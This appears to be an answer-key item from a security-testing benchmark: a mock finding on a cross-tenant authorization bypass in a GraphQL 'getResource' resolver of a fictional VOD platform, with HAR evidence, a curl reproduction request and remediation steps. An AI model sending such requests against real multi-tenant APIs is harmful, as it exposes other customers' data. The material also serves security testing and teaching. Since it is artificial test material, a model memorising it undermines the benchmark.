# Expected Response

## System
- Domain: Media / VOD Platform
- System: StreamCore VOD Platform
- Example ID: GQL-0169

## Priority Findings

### Finding 1: Media VOD — Authorization-Bypass Injection via getResource (Pattern 5.1)
**Severity:** High
**Category:** Injection / Authorization-Bypass Injection

**Summary:**
Per §5.0 (Pattern 5.1 — authorization-bypass injection): The `getResource` resolver accepts `resourceId` that can be manipulated to bypass authorization, exposing cross-tenant VOD content. An attacker from `tenant-613b` queried `getResource(id: "R-2169")` and received VOD platform data belonging to `tenant-9c08`, including `CONFIDENTIAL-613b9c08`. In Media / VOD, this exposes licensed content libraries, subscriber data, and DRM-protected stream configurations.

**Evidence from HAR:**
- Request: `POST https://api.streamcore-vod-platf.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-613b`
- Query: `getResource(id: "R-2169") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-9c08"`, `ownerId: "other-user-613b9c08"`, `sensitiveField: "CONFIDENTIAL-613b9c08"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-613b9c08`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 5.1 | Authorization-bypass injection |
| HAR request | x-tenant-id | Attacker tenant-613b |
| HAR response | tenantId | Cross-tenant VOD data tenant-9c08 |
| HAR response | sensitiveField | CONFIDENTIAL-613b9c08 |

## Steps to Reproduce

### Step 1 — getResource auth-bypass injection (HAR)
```bash
curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-613b" \
  -d '{"query": "query { getResource(id: \"R-2169\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `tenant-9c08` VOD data returned. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Parameterize all resolver inputs; reject unsanitized IDs.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
